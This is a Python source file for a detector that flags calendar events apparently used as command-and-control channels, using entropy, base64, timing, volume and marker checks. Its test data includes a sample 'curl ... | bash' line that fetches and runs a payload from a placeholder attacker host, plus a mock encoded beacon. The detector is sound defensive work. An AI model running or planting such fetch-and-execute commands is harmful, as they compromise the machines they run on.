import base64
import math
from datetime import datetime
from config import (
    ENTROPY_THRESHOLD, BASE64_MIN_LENGTH,
    BUSINESS_HOURS_START, BUSINESS_HOURS_END,
    SHORT_TITLE_MAX, LONG_DESCRIPTION_MIN,
    C2_MARKERS, CRITICAL_FLAG_COUNT,
    HIGH_FLAG_COUNT, MEDIUM_FLAG_COUNT,
    CF_REMEDIATION
)

def calculate_entropy(text):
    """
    Calculate Shannon entropy of a string.
    High entropy = likely encoded/encrypted payload.

    Cloudflare 2026 Threat Report: Chinese APT groups embed
    base64-encoded C2 commands in Calendar event descriptions.
    Legitimate calendar text has entropy ~3.5
    Encoded payloads typically exceed 4.5
    """
    if not text:
        return 0
    freq = {}
    for c in text:
        freq[c] = freq.get(c, 0) + 1
    length = len(text)
    entropy = -sum(
        (count / length) * math.log2(count / length)
        for count in freq.values()
    )
    return round(entropy, 3)


def is_base64(text):
    """Check if a string is valid base64 encoded content."""
    try:
        if len(text) % 4 != 0:
            return False
        decoded = base64.b64decode(text)
        return len(decoded) > BASE64_MIN_LENGTH
    except Exception:
        return False


def check_suspicious_timing(event):
    """
    Flag events created outside business hours.
    APT operators typically push C2 commands during victim's off-hours
    to reduce chance of real-time detection.
    """
    created = event.get('created', '')
    if not created:
        return False
    try:
        hour = datetime.fromisoformat(created).hour
        return hour < BUSINESS_HOURS_START or hour > BUSINESS_HOURS_END
    except Exception:
        return False

def check_volume_spike(events, window_minutes=30, spike_threshold=3):
    """
    Detect unusual bursts of calendar event creation.
    APT operators sometimes push multiple C2 commands
    in rapid succession — this flags that pattern.
    
    Returns list of time windows with suspicious activity.
    """
    from collections import defaultdict
    
    # Group events by 30-minute creation windows
    windows = defaultdict(list)
    
    for event in events:
        created = event.get('created', '')
        if not created:
            continue
        try:
            dt = datetime.fromisoformat(created.replace('Z', '+00:00'))
            # Round down to nearest window
            window_key = dt.replace(
                minute=(dt.minute // window_minutes) * window_minutes,
                second=0,
                microsecond=0
            )
            windows[window_key].append(event.get('summary', 'Untitled'))
        except Exception:
            continue
    
    # Flag any window with more events than threshold
    spikes = []
    for window_time, window_events in windows.items():
        if len(window_events) >= spike_threshold:
            spikes.append({
                'window': window_time.strftime('%Y-%m-%d %H:%M'),
                'count': len(window_events),
                'events': window_events,
                'risk': 'HIGH' if len(window_events) >= 5 else 'MEDIUM'
            })
    
    return spikes

def analyse_event(event):
    """
    Core detection logic — analyse a single calendar event
    for Living-off-the-Cloud C2 indicators.

    Returns a risk report dict with findings and severity.
    """
    description = event.get('description', '')
    title = event.get('summary', 'Untitled')
    flags = []
    evidence = []

    # Check 1 — Shannon entropy on description field
    entropy = calculate_entropy(description)
    if entropy > ENTROPY_THRESHOLD:
        flags.append('HIGH_ENTROPY')
        evidence.append(f"Entropy score {entropy} exceeds threshold of {ENTROPY_THRESHOLD}")

    # Check 2 — Base64 decodable content
    if is_base64(description.strip()):
        flags.append('BASE64_PAYLOAD')
        evidence.append("Description is valid base64 — possible encoded C2 command")

    # Check 3 — Suspicious creation time
    if check_suspicious_timing(event):
        flags.append('OFF_HOURS_CREATION')
        evidence.append(f"Event created outside business hours (before {BUSINESS_HOURS_START:02d}:00 or after {BUSINESS_HOURS_END:02d}:00)")

    # Check 4 — Unusually short title with long description
    if len(title) < SHORT_TITLE_MAX and len(description) > LONG_DESCRIPTION_MIN:
        flags.append('SUSPICIOUS_RATIO')
        evidence.append(f"Short title ({len(title)} chars) with long description ({len(description)} chars)")

    # Check 5 — Known C2 payload markers
    found_markers = [m for m in C2_MARKERS if m.lower() in description.lower()]
    if found_markers:
        flags.append('C2_MARKERS')
        evidence.append(f"Known C2 markers found: {found_markers}")

    # Risk scoring
    if len(flags) >= CRITICAL_FLAG_COUNT:
        risk = 'CRITICAL'
    elif len(flags) >= HIGH_FLAG_COUNT:
        risk = 'HIGH'
    elif len(flags) >= MEDIUM_FLAG_COUNT:
        risk = 'MEDIUM'
    else:
        risk = 'LOW'

    # Cloudflare remediation mapping
    remediation = list(set(
        CF_REMEDIATION.get(flag, '') for flag in flags
    ))
    remediation = [r for r in remediation if r]

    return {
        'event': title,
        'entropy': entropy,
        'flags': flags,
        'evidence': evidence,
        'risk': risk,
        'flag_count': len(flags),
        'remediation': remediation
    }


def scan_events(events):
    """
    Scan a list of calendar events and return prioritised findings.
    Higher risk events surfaced first.
    """
    results = []
    for event in events:
        result = analyse_event(event)
        results.append(result)

    risk_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
    results.sort(key=lambda x: risk_order[x['risk']])
    return results


def print_report(results):
    """Print a clean terminal report of findings."""
    print("\n" + "="*60)
    print("  LotX Detector — C2 Beacon Analysis Report")
    print("  Based on Cloudflare 2026 Threat Report findings")
    print("="*60)

    critical = [r for r in results if r['risk'] == 'CRITICAL']
    high = [r for r in results if r['risk'] == 'HIGH']

    print(f"\n  Total events scanned: {len(results)}")
    print(f"  Critical findings:    {len(critical)}")
    print(f"  High findings:        {len(high)}")
    print()

    for r in results:
        if r['risk'] in ('CRITICAL', 'HIGH', 'MEDIUM'):
            print(f"  [{r['risk']}] {r['event']}")
            print(f"  Entropy: {r['entropy']} | Flags: {r['flag_count']}")
            for e in r['evidence']:
                print(f"    → {e}")
            if r['remediation']:
                print(f"  Cloudflare fix:")
                for rem in r['remediation']:
                    print(f"    ⚡ {rem}")
            print()
def print_spike_report(spikes):
    """Print volume spike findings."""
    if not spikes:
        return
    print("\n  Volume spike analysis:")
    for spike in spikes:
        print(f"  [{spike['risk']}] {spike['count']} events in 30-min window at {spike['window']}")
        for e in spike['events']:
            print(f"    → {e}")
    print("="*60 + "\n")


if __name__ == "__main__":
    test_events = [
        {
            'summary': 'Q2 Planning',
            'description': 'U2FsdGVkX1+mocked+base64+payload+simulating+C2+beacon+command+exec=whoami==',
            'created': '2026-03-18T03:42:00'
        },
        {
            'summary': 'Team standup',
            'description': 'Discuss sprint progress and blockers. Review PRs.',
            'created': '2026-03-18T09:00:00'
        },
        {
            'summary': 'Sync',
            'description': 'curl -s http://185.220.x.x/payload | bash && wget http://c2.onion/beacon',
            'created': '2026-03-18T02:15:00'
        },
        {
            'summary': 'Budget review',
            'description': 'Q3 budget planning session with finance team.',
            'created': '2026-03-18T14:00:00'
        }
    ]

    results = scan_events(test_events)
    print_report(results)